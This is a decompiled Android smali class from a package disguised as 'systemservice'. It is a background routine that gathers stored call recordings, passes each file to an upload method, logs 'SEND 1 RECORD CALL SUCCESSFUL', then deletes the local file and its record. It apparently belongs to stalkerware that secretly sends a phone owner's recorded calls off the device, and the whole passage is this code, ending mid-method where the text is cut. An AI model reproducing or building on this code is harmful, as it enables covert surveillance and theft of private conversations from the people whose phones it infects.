.class Lcom/systemservice/a/c/c/k;
.super Ljava/lang/Object;
.source ""

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/systemservice/a/c/c/l;->run()V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Lcom/systemservice/a/h/m;

.field final synthetic b:Lcom/systemservice/a/c/c/l;


# direct methods
.method constructor <init>(Lcom/systemservice/a/c/c/l;Lcom/systemservice/a/h/m;)V
    .locals 0

    iput-object p1, p0, Lcom/systemservice/a/c/c/k;->b:Lcom/systemservice/a/c/c/l;

    iput-object p2, p0, Lcom/systemservice/a/c/c/k;->a:Lcom/systemservice/a/h/m;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 15
    .annotation build Landroid/annotation/SuppressLint;
        value = {
            "NewApi"
        }
    .end annotation

    iget-object v0, p0, Lcom/systemservice/a/c/c/k;->b:Lcom/systemservice/a/c/c/l;

    iget-object v0, v0, Lcom/systemservice/a/c/c/l;->a:Landroid/content/Context;

    const-string v1, "sending_call_recording"

    const/4 v2, 0x0

    invoke-static {v0, v1, v2}, Lcom/systemservice/a/a/l;->a(Landroid/content/Context;Ljava/lang/String;Z)Z

    move-result v0

    if-eqz v0, :cond_0

    return-void

    :cond_0
    iget-object v0, p0, Lcom/systemservice/a/c/c/k;->b:Lcom/systemservice/a/c/c/l;

    iget-object v0, v0, Lcom/systemservice/a/c/c/l;->a:Landroid/content/Context;

    invoke-static {v0}, Lcom/systemservice/common/features/settingHistory/b;->c(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_c

    iget-object v0, p0, Lcom/systemservice/a/c/c/k;->b:Lcom/systemservice/a/c/c/l;

    iget-object v0, v0, Lcom/systemservice/a/c/c/l;->b:Lcom/systemservice/a/c/c/m;

    invoke-static {v0}, Lcom/systemservice/a/c/c/m;->e(Lcom/systemservice/a/c/c/m;)Landroid/content/SharedPreferences;

    move-result-object v0

    const-string v3, "media_data_transfered_by_wifi_only"

    invoke-interface {v0, v3, v2}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v0

    const-string v3, "save_battery"

    if-eqz v0, :cond_1

    iget-object v0, p0, Lcom/systemservice/a/c/c/k;->b:Lcom/systemservice/a/c/c/l;

    iget-object v0, v0, Lcom/systemservice/a/c/c/l;->b:Lcom/systemservice/a/c/c/m;

    invoke-static {v0}, Lcom/systemservice/a/c/c/m;->e(Lcom/systemservice/a/c/c/m;)Landroid/content/SharedPreferences;

    move-result-object v0

    invoke-interface {v0, v3, v2}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v0

    if-nez v0, :cond_1

    iget-object v0, p0, Lcom/systemservice/a/c/c/k;->b:Lcom/systemservice/a/c/c/l;

    iget-object v0, v0, Lcom/systemservice/a/c/c/l;->a:Landroid/content/Context;

    invoke-static {v0}, Lcom/systemservice/a/a/h;->c(Landroid/content/Context;)Z

    move-result v0

    if-nez v0, :cond_1

    iget-object v0, p0, Lcom/systemservice/a/c/c/k;->b:Lcom/systemservice/a/c/c/l;

    iget-object v0, v0, Lcom/systemservice/a/c/c/l;->b:Lcom/systemservice/a/c/c/m;

    invoke-static {v0}, Lcom/systemservice/a/c/c/m;->a(Lcom/systemservice/a/c/c/m;)Lorg/apache/log4j/Logger;

    move-result-object v0

    const-string v1, "WiFi ONLY = false"

    invoke-virtual {v0, v1}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V

    iget-object v0, p0, Lcom/systemservice/a/c/c/k;->b:Lcom/systemservice/a/c/c/l;

    iget-object v0, v0, Lcom/systemservice/a/c/c/l;->b:Lcom/systemservice/a/c/c/m;

    invoke-static {v0}, Lcom/systemservice/a/c/c/m;->b(Lcom/systemservice/a/c/c/m;)Ljava/lang/String;

    move-result-object v0

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    return-void

    :cond_1
    iget-object v0, p0, Lcom/systemservice/a/c/c/k;->b:Lcom/systemservice/a/c/c/l;

    iget-object v0, v0, Lcom/systemservice/a/c/c/l;->b:Lcom/systemservice/a/c/c/m;

    invoke-static {v0}, Lcom/systemservice/a/c/c/m;->e(Lcom/systemservice/a/c/c/m;)Landroid/content/SharedPreferences;

    move-result-object v0

    invoke-interface {v0, v3, v2}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v0

    const-string v3, "ProtocolForRecordCall"

    const-wide/16 v4, 0x1388

    const-string v6, "SEND 1 RECORD CALL SUCCESSFUL"

    const/4 v7, 0x0

    const/4 v8, 0x1

    const-string v9, ""

    if-eqz v0, :cond_6

    iget-object v0, p0, Lcom/systemservice/a/c/c/k;->b:Lcom/systemservice/a/c/c/l;

    iget-object v0, v0, Lcom/systemservice/a/c/c/l;->a:Landroid/content/Context;

    invoke-static {v0}, Lcom/systemservice/a/a/h;->b(Landroid/content/Context;)Z

    move-result v0

    if-eqz v0, :cond_c

    iget-object v0, p0, Lcom/systemservice/a/c/c/k;->b:Lcom/systemservice/a/c/c/l;

    iget-object v0, v0, Lcom/systemservice/a/c/c/l;->b:Lcom/systemservice/a/c/c/m;

    invoke-static {v0}, Lcom/systemservice/a/c/c/m;->e(Lcom/systemservice/a/c/c/m;)Landroid/content/SharedPreferences;

    move-result-object v0

    const-string v10, "battery"

    invoke-interface {v0, v10, v8}, Landroid/content/SharedPreferences;->getBoolean(Ljava/lang/String;Z)Z

    move-result v0

    if-eqz v0, :cond_c

    :try_start_0
    iget-object v0, p0, Lcom/systemservice/a/c/c/k;->a:Lcom/systemservice/a/h/m;

    invoke-virtual {v0, v2, v7, v7}, Lcom/systemservice/a/h/m;->a(ZLjava/util/Date;Ljava/util/Date;)Ljava/util/List;

    move-result-object v0

    if-eqz v0, :cond_b

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v7

    if-lez v7, :cond_b

    iget-object v7, p0, Lcom/systemservice/a/c/c/k;->b:Lcom/systemservice/a/c/c/l;

    iget-object v7, v7, Lcom/systemservice/a/c/c/l;->a:Landroid/content/Context;

    invoke-static {v7, v1, v8}, Lcom/systemservice/a/a/l;->b(Landroid/content/Context;Ljava/lang/String;Z)V

    iget-object v7, p0, Lcom/systemservice/a/c/c/k;->b:Lcom/systemservice/a/c/c/l;

    iget-object v7, v7, Lcom/systemservice/a/c/c/l;->b:Lcom/systemservice/a/c/c/m;

    invoke-virtual {v7}, Lcom/systemservice/a/d/g;->d()Lcom/systemservice/common/features/settingHistory/b;

    move-result-object v7

    check-cast v7, Lcom/systemservice/a/c/c/o;

    invoke-interface {v0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v0

    :cond_2
    :goto_0
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v10

    if-eqz v10, :cond_5

    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v10

    check-cast v10, Lcom/systemservice/a/d/d;

    check-cast v10, Lcom/systemservice/a/e/f;

    if-eqz v10, :cond_2

    new-instance v11, Ljava/io/File;

    invoke-virtual {v10}, Lcom/systemservice/a/e/f;->e()Ljava/lang/String;

    move-result-object v12

    invoke-direct {v11, v12}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v11}, Ljava/io/File;->exists()Z

    move-result v12

    if-eqz v12, :cond_4

    iget-object v12, p0, Lcom/systemservice/a/c/c/k;->b:Lcom/systemservice/a/c/c/l;

    iget-object v12, v12, Lcom/systemservice/a/c/c/l;->a:Landroid/content/Context;

    invoke-virtual {v7, v12, v11, v10}, Lcom/systemservice/a/c/c/o;->a(Landroid/content/Context;Ljava/io/File;Lcom/systemservice/a/e/f;)I

    move-result v12

    if-ne v12, v8, :cond_3

    invoke-static {v3, v6}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v12, p0, Lcom/systemservice/a/c/c/k;->b:Lcom/systemservice/a/c/c/l;

    iget-object v12, v12, Lcom/systemservice/a/c/c/l;->b:Lcom/systemservice/a/c/c/m;

    invoke-static {v12}, Lcom/systemservice/a/c/c/m;->a(Lcom/systemservice/a/c/c/m;)Lorg/apache/log4j/Logger;

    move-result-object v12

    invoke-virtual {v12, v6}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_4
    .catchall {:try_start_0 .. :try_end_0} :catchall_0

    :try_start_1
    iget-object v12, p0, Lcom/systemservice/a/c/c/k;->a:Lcom/systemservice/a/h/m;

    invoke-virtual {v10}, Lcom/systemservice/a/e/f;->h()J

    move-result-wide v13

    invoke-virtual {v12, v13, v14}, Lcom/systemservice/a/h/m;->a(J)V

    invoke-virtual {v11}, Ljava/io/File;->delete()Z
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    :try_start_2
    invoke-static {v4, v5}, Ljava/lang/Thread;->sleep(J)V
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_0
    .catchall {:try_start_2 .. :try_end_2} :catchall_0

    goto :goto_0

    :catch_0
    move-exception v10

    :try_start_3
    iget-object v11, p0, Lcom/systemservice/a/c/c/k;->b:Lcom/systemservice/a/c/c/l;

    iget-object v11, v11, Lcom/systemservice/a/c/c/l;->b:Lcom/systemservice/a/c/c/m;

    invoke-static {v11}, Lcom/systemservice/a/c/c/m;->a(Lcom/systemservice/a/c/c/m;)Lorg/apache/log4j/Logger;

    move-result-object v11

    new-instance v12, Ljava/lang/StringBuilder;

    invoke-direct {v12}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v10}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v12, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v12, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v11, v10}, Lorg/apache/log4j/Category;->error(Ljava/lang/Object;)V
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_1
    .catchall {:try_start_3 .. :try_end_3} :catchall_0

    goto :goto_0

    :catch_1
    move-exception v10

    :try_start_4
    invoke-virtual {v10}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    iget-object v11, p0, Lcom/systemservice/a/c/c/k;->b:Lcom/systemservice/a/c/c/l;

    iget-object v11, v11, Lcom/systemservice/a/c/c/l;->b:Lcom/systemservice/a/c/c/m;

    invoke-static {v11}, Lcom/systemservice/a/c/c/m;->a(Lcom/systemservice/a/c/c/m;)Lorg/apache/log4j/Logger;

    move-result-object v11

    new-instance v12, Ljava/lang/StringBuilder;

    invoke-direct {v12}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v10}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v12, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v12, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    :goto_1
    invoke-virtual {v11, v10}, Lorg/apache/log4j/Category;->error(Ljava/lang/Object;)V
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_4
    .catchall {:try_start_4 .. :try_end_4} :catchall_0

    goto/16 :goto_0

    :cond_3
    :try_start_5
    iget-object v12, p0, Lcom/systemservice/a/c/c/k;->a:Lcom/systemservice/a/h/m;

    invoke-virtual {v10}, Lcom/systemservice/a/e/f;->h()J

    move-result-wide v13

    invoke-virtual {v12, v13, v14}, Lcom/systemservice/a/h/m;->a(J)V

    invoke-virtual {v11}, Ljava/io/File;->delete()Z
    :try_end_5
    .catch Ljava/lang/Exception; {:try_start_5 .. :try_end_5} :catch_3
    .catchall {:try_start_5 .. :try_end_5} :catchall_0

    :try_start_6
    invoke-static {v4, v5}, Ljava/lang/Thread;->sleep(J)V
    :try_end_6
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_6} :catch_2
    .catchall {:try_start_6 .. :try_end_6} :catchall_0

    goto/16 :goto_0

    :catch_2
    move-exception v10

    :try_start_7
    iget-object v11, p0, Lcom/systemservice/a/c/c/k;->b:Lcom/systemservice/a/c/c/l;

    iget-object v11, v11, Lcom/systemservice/a/c/c/l;->b:Lcom/systemservice/a/c/c/m;

    invoke-static {v11}, Lcom/systemservice/a/c/c/m;->b(Lcom/systemservice/a/c/c/m;)Ljava/lang/String;

    move-result-object v11

    new-instance v12, Ljava/lang/StringBuilder;

    invoke-direct {v12}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v10}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v12, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12

    invoke-static {v11, v12}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v11, p0, Lcom/systemservice/a/c/c/k;->b:Lcom/systemservice/a/c/c/l;

    iget-object v11, v11, Lcom/systemservice/a/c/c/l;->b:Lcom/systemservice/a/c/c/m;

    invoke-static {v11}, Lcom/systemservice/a/c/c/m;->a(Lcom/systemservice/a/c/c/m;)Lorg/apache/log4j/Logger;

    move-result-object v11

    new-instance v12, Ljava/lang/StringBuilder;

    invoke-direct {v12}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v10}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v12, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v12, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v11, v10}, Lorg/apache/log4j/Category;->error(Ljava/lang/Object;)V
    :try_end_7
    .catch Ljava/lang/Exception; {:try_start_7 .. :try_end_7} :catch_3
    .catchall {:try_start_7 .. :try_end_7} :catchall_0

    goto/16 :goto_0

    :catch_3
    move-exception v10

    :try_start_8
    iget-object v11, p0, Lcom/systemservice/a/c/c/k;->b:Lcom/systemservice/a/c/c/l;

    iget-object v11, v11, Lcom/systemservice/a/c/c/l;->b:Lcom/systemservice/a/c/c/m;

    invoke-static {v11}, Lcom/systemservice/a/c/c/m;->b(Lcom/systemservice/a/c/c/m;)Ljava/lang/String;

    move-result-object v11

    new-instance v12, Ljava/lang/StringBuilder;

    invoke-direct {v12}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v10}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v12, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12

    invoke-static {v11, v12}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v11, p0, Lcom/systemservice/a/c/c/k;->b:Lcom/systemservice/a/c/c/l;

    iget-object v11, v11, Lcom/systemservice/a/c/c/l;->b:Lcom/systemservice/a/c/c/m;

    invoke-static {v11}, Lcom/systemservice/a/c/c/m;->a(Lcom/systemservice/a/c/c/m;)Lorg/apache/log4j/Logger;

    move-result-object v11

    new-instance v12, Ljava/lang/StringBuilder;

    invoke-direct {v12}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v10}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v12, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v12, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    goto/16 :goto_1

    :cond_4
    iget-object v11, p0, Lcom/systemservice/a/c/c/k;->a:Lcom/systemservice/a/h/m;

    invoke-virtual {v10}, Lcom/systemservice/a/e/f;->h()J

    move-result-wide v12

    invoke-virtual {v11, v12, v13}, Lcom/systemservice/a/h/m;->a(J)V

    goto/16 :goto_0

    :cond_5
    iget-object v0, p0, Lcom/systemservice/a/c/c/k;->b:Lcom/systemservice/a/c/c/l;

    iget-object v0, v0, Lcom/systemservice/a/c/c/l;->a:Landroid/content/Context;

    invoke-static {v0, v1, v2}, Lcom/systemservice/a/a/l;->b(Landroid/content/Context;Ljava/lang/String;Z)V
    :try_end_8
    .catch Ljava/lang/Exception; {:try_start_8 .. :try_end_8} :catch_4
    .catchall {:try_start_8 .. :try_end_8} :catchall_0

    goto/16 :goto_5

    :catchall_0
    move-exception v0

    goto :goto_2

    :catch_4
    move-exception v0

    :try_start_9
    iget-object v3, p0, Lcom/systemservice/a/c/c/k;->b:Lcom/systemservice/a/c/c/l;

    iget-object v3, v3, Lcom/systemservice/a/c/c/l;->b:Lcom/systemservice/a/c/c/m;

    invoke-static {v3}, Lcom/systemservice/a/c/c/m;->b(Lcom/systemservice/a/c/c/m;)Ljava/lang/String;

    move-result-object v3

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-static {v3, v4}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v3, p0, Lcom/systemservice/a/c/c/k;->b:Lcom/systemservice/a/c/c/l;

    iget-object v3, v3, Lcom/systemservice/a/c/c/l;->b:Lcom/systemservice/a/c/c/m;

    invoke-static {v3}, Lcom/systemservice/a/c/c/m;->a(Lcom/systemservice/a/c/c/m;)Lorg/apache/log4j/Logger;

    move-result-object v3

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v0}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v4, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-virtual {v3, v0}, Lorg/apache/log4j/Category;->error(Ljava/lang/Object;)V
    :try_end_9
    .catchall {:try_start_9 .. :try_end_9} :catchall_0

    goto/16 :goto_5

    :goto_2
    iget-object v3, p0, Lcom/systemservice/a/c/c/k;->b:Lcom/systemservice/a/c/c/l;

    iget-object v3, v3, Lcom/systemservice/a/c/c/l;->a:Landroid/content/Context;

    invoke-static {v3, v1, v2}, Lcom/systemservice/a/a/l;->b(Landroid/content/Context;Ljava/lang/String;Z)V

    throw v0

    :cond_6
    :try_start_a
    iget-object v0, p0, Lcom/systemservice/a/c/c/k;->a:Lcom/systemservice/a/h/m;

    invoke-virtual {v0, v2, v7, v7}, Lcom/systemservice/a/h/m;->a(ZLjava/util/Date;Ljava/util/Date;)Ljava/util/List;

    move-result-object v0

    if-eqz v0, :cond_b

    invoke-interface {v0}, Ljava/util/List;->size()I

    move-result v7

    if-lez v7, :cond_b

    iget-object v7, p0, Lcom/systemservice/a/c/c/k;->b:Lcom/systemservice/a/c/c/l;

    iget-object v7, v7, Lcom/systemservice/a/c/c/l;->a:Landroid/content/Context;

    invoke-static {v7, v1, v8}, Lcom/systemservice/a/a/l;->b(Landroid/content/Context;Ljava/lang/String;Z)V

    iget-object v7, p0, Lcom/systemservice/a/c/c/k;->b:Lcom/systemservice/a/c/c/l;

    iget-object v7, v7, Lcom/systemservice/a/c/c/l;->b:Lcom/systemservice/a/c/c/m;

    invoke-virtual {v7}, Lcom/systemservice/a/d/g;->d()Lcom/systemservice/common/features/settingHistory/b;

    move-result-object v7

    check-cast v7, Lcom/systemservice/a/c/c/o;

    invoke-interface {v0}, Ljava/util/List;->iterator()Ljava/util/Iterator;

    move-result-object v0

    :cond_7
    :goto_3
    invoke-interface {v0}, Ljava/util/Iterator;->hasNext()Z

    move-result v10

    if-eqz v10, :cond_a

    invoke-interface {v0}, Ljava/util/Iterator;->next()Ljava/lang/Object;

    move-result-object v10

    check-cast v10, Lcom/systemservice/a/d/d;

    check-cast v10, Lcom/systemservice/a/e/f;

    if-eqz v10, :cond_7

    new-instance v11, Ljava/io/File;

    invoke-virtual {v10}, Lcom/systemservice/a/e/f;->e()Ljava/lang/String;

    move-result-object v12

    invoke-direct {v11, v12}, Ljava/io/File;-><init>(Ljava/lang/String;)V

    invoke-virtual {v11}, Ljava/io/File;->exists()Z

    move-result v12

    if-eqz v12, :cond_9

    iget-object v12, p0, Lcom/systemservice/a/c/c/k;->b:Lcom/systemservice/a/c/c/l;

    iget-object v12, v12, Lcom/systemservice/a/c/c/l;->a:Landroid/content/Context;

    invoke-virtual {v7, v12, v11, v10}, Lcom/systemservice/a/c/c/o;->a(Landroid/content/Context;Ljava/io/File;Lcom/systemservice/a/e/f;)I

    move-result v12

    if-ne v12, v8, :cond_8

    invoke-static {v3, v6}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v12, p0, Lcom/systemservice/a/c/c/k;->b:Lcom/systemservice/a/c/c/l;

    iget-object v12, v12, Lcom/systemservice/a/c/c/l;->b:Lcom/systemservice/a/c/c/m;

    invoke-static {v12}, Lcom/systemservice/a/c/c/m;->a(Lcom/systemservice/a/c/c/m;)Lorg/apache/log4j/Logger;

    move-result-object v12

    invoke-virtual {v12, v6}, Lorg/apache/log4j/Category;->debug(Ljava/lang/Object;)V
    :try_end_a
    .catch Ljava/lang/Exception; {:try_start_a .. :try_end_a} :catch_8
    .catchall {:try_start_a .. :try_end_a} :catchall_1

    :try_start_b
    iget-object v12, p0, Lcom/systemservice/a/c/c/k;->a:Lcom/systemservice/a/h/m;

    invoke-virtual {v10}, Lcom/systemservice/a/e/f;->h()J

    move-result-wide v13

    invoke-virtual {v12, v13, v14}, Lcom/systemservice/a/h/m;->a(J)V

    invoke-virtual {v11}, Ljava/io/File;->delete()Z

    invoke-static {v4, v5}, Ljava/lang/Thread;->sleep(J)V
    :try_end_b
    .catch Ljava/lang/Exception; {:try_start_b .. :try_end_b} :catch_5
    .catchall {:try_start_b .. :try_end_b} :catchall_1

    goto :goto_3

    :catch_5
    move-exception v10

    :try_start_c
    invoke-virtual {v10}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    iget-object v11, p0, Lcom/systemservice/a/c/c/k;->b:Lcom/systemservice/a/c/c/l;

    iget-object v11, v11, Lcom/systemservice/a/c/c/l;->b:Lcom/systemservice/a/c/c/m;

    invoke-static {v11}, Lcom/systemservice/a/c/c/m;->a(Lcom/systemservice/a/c/c/m;)Lorg/apache/log4j/Logger;

    move-result-object v11

    new-instance v12, Ljava/lang/StringBuilder;

    invoke-direct {v12}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v10}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v12, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v12, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    :goto_4
    invoke-virtual {v11, v10}, Lorg/apache/log4j/Category;->error(Ljava/lang/Object;)V
    :try_end_c
    .catch Ljava/lang/Exception; {:try_start_c .. :try_end_c} :catch_8
    .catchall {:try_start_c .. :try_end_c} :catchall_1

    goto :goto_3

    :cond_8
    :try_start_d
    iget-object v12, p0, Lcom/systemservice/a/c/c/k;->a:Lcom/systemservice/a/h/m;

    invoke-virtual {v10}, Lcom/systemservice/a/e/f;->h()J

    move-result-wide v13

    invoke-virtual {v12, v13, v14}, Lcom/systemservice/a/h/m;->a(J)V

    invoke-virtual {v11}, Ljava/io/File;->delete()Z
    :try_end_d
    .catch Ljava/lang/Exception; {:try_start_d .. :try_end_d} :catch_7
    .catchall {:try_start_d .. :try_end_d} :catchall_1

    :try_start_e
    invoke-static {v4, v5}, Ljava/lang/Thread;->sleep(J)V
    :try_end_e
    .catch Ljava/lang/Exception; {:try_start_e .. :try_end_e} :catch_6
    .catchall {:try_start_e .. :try_end_e} :catchall_1

    goto :goto_3

    :catch_6
    move-exception v10

    :try_start_f
    iget-object v11, p0, Lcom/systemservice/a/c/c/k;->b:Lcom/systemservice/a/c/c/l;

    iget-object v11, v11, Lcom/systemservice/a/c/c/l;->b:Lcom/systemservice/a/c/c/m;

    invoke-static {v11}, Lcom/systemservice/a/c/c/m;->b(Lcom/systemservice/a/c/c/m;)Ljava/lang/String;

    move-result-object v11

    new-instance v12, Ljava/lang/StringBuilder;

    invoke-direct {v12}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v10}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v12, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v12, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    invoke-static {v11, v10}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_f
    .catch Ljava/lang/Exception; {:try_start_f .. :try_end_f} :catch_7
    .catchall {:try_start_f .. :try_end_f} :catchall_1

    goto/16 :goto_3

    :catch_7
    move-exception v10

    :try_start_10
    iget-object v11, p0, Lcom/systemservice/a/c/c/k;->b:Lcom/systemservice/a/c/c/l;

    iget-object v11, v11, Lcom/systemservice/a/c/c/l;->b:Lcom/systemservice/a/c/c/m;

    invoke-static {v11}, Lcom/systemservice/a/c/c/m;->b(Lcom/systemservice/a/c/c/m;)Ljava/lang/String;

    move-result-object v11

    new-instance v12, Ljava/lang/StringBuilder;

    invoke-direct {v12}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v10}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v13

    invoke-virtual {v12, v13}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v12, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v12

    invoke-static {v11, v12}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    iget-object v11, p0, Lcom/systemservice/a/c/c/k;->b:Lcom/systemservice/a/c/c/l;

    iget-object v11, v11, Lcom/systemservice/a/c/c/l;->b:Lcom/systemservice/a/c/c/m;

    invoke-static {v11}, Lcom/systemservice/a/c/c/m;->a(Lcom/systemservice/a/c/c/m;)Lorg/apache/log4j/Logger;

    move-result-object v11

    new-instance v12, Ljava/lang/StringBuilder;

    invoke-direct {v12}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v10}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v12, v10}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v12, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v12}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v10

    goto :goto_4

    :cond_9
    iget-object v11, p0, Lcom/systemservice/a/c/c/k;->a:Lcom/systemservice/a/h/m;

    invoke-virtual {v10}, Lcom/systemservice/a/e/f;->h()J

    move-result-wide v12

    invoke-virtual {v11, v12, v13}, Lcom/systemservice/a/h/m;->a(J)V

    goto/16 :goto_3

    :cond_a
    iget-object v0, p0, Lcom/systemservice/a/c/c/k;->b:Lcom/systemservice/a/c/c/l;

    iget-object v0, v0, Lcom/systemservice/a/c/c/l;->a:Landroid/content/Context;

    invoke-static {v0, v1, v2}, Lcom/systemservice/a/a/l;->b(Landroid/content/Context;Ljava/lang/String;Z)V
    :try_end_10
